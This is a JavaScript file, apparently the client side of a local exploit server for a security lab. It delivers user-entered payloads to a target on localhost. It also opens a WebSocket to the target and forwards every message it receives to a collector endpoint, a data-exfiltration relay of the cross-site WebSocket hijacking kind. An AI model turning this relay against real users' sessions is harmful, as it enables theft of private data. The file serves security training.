// exploit/exploit.js

document.addEventListener("DOMContentLoaded", () => {
    const exploitBody = document.getElementById("exploitBody");
    const exploitForm = document.getElementById("exploitForm");
    const logsBtn = document.getElementById("logsBtn");
    const homeBtn = document.getElementById("homeBtn");
    const protocol = window.location.protocol;
    const host = window.location.hostname;
    const logsPort = 888;
    const mainServerUrl = `http://localhost:727`;
    const collectUrl = `http://localhost:888/collect`;

    // ----------------- 기존 익스플로잇 폼 동작 ----------------- //
    exploitForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        const payload = exploitBody.value.trim();
        if (!payload) return;

        try {
            await fetch(`${mainServerUrl}/deliver`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ payload })
            });
        } catch (err) {
            console.error("Error delivering exploit:", err);
        }
    });

    if (logsBtn) {
        logsBtn.addEventListener("click", () => {
            const logsUrl = `${protocol}//${host}:${logsPort}/logs`;
            window.open(logsUrl, "_blank");
        });
    }

    if (homeBtn) {
        homeBtn.addEventListener("click", () => {
            window.location.href = `${mainServerUrl}/`;
        });
    }

    // ----------------- WebSocket 메시지 수신 기능 ----------------- //
    try {
        const ws = new WebSocket(`ws://${host}:727`);

        ws.onopen = function() {
            // READY 이벤트 전송 (새 세션)
            ws.send(JSON.stringify({ type: "READY" }));
        };

        ws.onmessage = function(event) {
            // 익스플로잇 서버로 메시지 전송
            fetch(collectUrl, {
                method: "POST",
                mode: "no-cors",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ msg: event.data })
            });
        };

        ws.onerror = function(err) {
            console.error("WebSocket error:", err);
        };
    } catch (err) {
        console.error("WebSocket initialization failed:", err);
    }
});
